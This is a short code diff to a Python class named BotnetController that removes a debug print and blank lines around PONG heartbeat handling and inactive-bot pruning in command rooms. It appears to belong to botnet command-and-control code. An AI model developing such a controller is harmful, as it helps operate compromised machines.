@@ -187,7 +187,6 @@ class BotnetController:
         elif action == "PONG":
             room_id, bot_id, pong_origin = info.rsplit(":", 2)
             pong_origin = float(pong_origin)
-            print("start:", self.pong_window_start, "origin:", pong_origin, "end:", self.pong_window_start + self.pong_window_dur)
             if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur):
                 # pong too late :(
                 print("PONG TOO LATE")
@@ -225,8 +224,6 @@ class BotnetController:
                 for room in self.command_rooms.values():
                     room.delete_inactive_bots()
                     
-                        
-
     def run(self):
         self.login()
         self.sync_rooms()
